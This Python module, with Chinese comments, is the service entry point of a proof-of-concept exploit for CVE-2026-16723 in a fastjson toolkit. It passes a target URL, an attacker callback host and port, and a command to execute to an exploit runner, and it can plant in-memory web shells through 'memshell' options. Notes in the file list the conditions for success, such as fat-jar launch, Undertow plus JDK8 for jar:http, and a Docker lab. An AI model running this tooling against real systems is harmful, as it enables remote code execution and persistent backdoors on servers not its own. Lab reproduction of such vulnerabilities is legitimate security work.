"""CVE-2026-16723 PoC 服务入口（供 CLI / API 调用）。"""

from __future__ import annotations

from typing import Optional

from fastjson_toolkit.poc.cve_2026_16723.models import Poc16723Options, Poc16723Result
from fastjson_toolkit.poc.cve_2026_16723.runner import main as runner_main
from fastjson_toolkit.poc.cve_2026_16723.runner import set_log_sink


def _options_to_argv(opts: Poc16723Options) -> list[str]:
    argv = [
        "-u",
        opts.target,
        "-m",
        opts.mode,
        "-H",
        opts.host,
        "-P",
        str(opts.port),
        "-c",
        opts.cmd,
        "--engine",
        opts.engine,
        "--json-path",
        opts.json_path,
        "--docker-container",
        opts.docker_container or "",
    ]
    if opts.echo and not opts.memshell:
        argv.append("-e")
    if opts.reuse_type:
        argv.extend(["-t", opts.reuse_type])
    if opts.memshell:
        argv.extend(
            [
                "--memshell",
                "--ms-api",
                opts.ms_api,
                "--ms-server",
                opts.ms_server,
                "--ms-tool",
                opts.ms_tool,
                "--ms-type",
                opts.ms_type,
                "--ms-path",
                opts.ms_path,
                "--ms-jdk",
                opts.ms_jdk,
            ]
        )
    return argv


def run_cve_2026_16723(
    options: Optional[Poc16723Options] = None,
    *,
    argv: Optional[list[str]] = None,
) -> Poc16723Result:
    """运行证明 PoC，返回结构化结果与日志。"""
    opts = options or Poc16723Options()
    logs: list[str] = []
    set_log_sink(logs)
    try:
        code = runner_main(argv if argv is not None else _options_to_argv(opts))
    finally:
        set_log_sink(None)

    ok = code == 0
    summary = "CVE-2026-16723 证明成功" if ok else f"CVE-2026-16723 证明失败 (exit={code})"
    # 从日志里抽一句 SUCCESS / 错误
    for line in reversed(logs):
        if line.startswith("[+] SUCCESS"):
            summary = line
            break
        if line.startswith("[!]"):
            summary = line
            break

    notes = [
        "须以 fat jar 启动（LaunchedURLClassLoader）；IDE 直接跑会复现失败。",
        "jar:http 需 Undertow + JDK8；Tomcat 内嵌对 jar:http 的 '//' 会在 forName0 失败。",
        "jar:file / fd-cache 不依赖连续斜杠，tomcat/undertow 均可。",
        "Docker 靶场请用 -H attacker（extra_hosts），勿用 127.0.0.1。",
    ]
    return Poc16723Result(
        ok=ok,
        exit_code=code,
        mode=opts.mode,
        target=opts.target,
        summary=summary,
        logs=logs,
        notes=notes,
        raw={"argv": argv if argv is not None else _options_to_argv(opts)},
    )
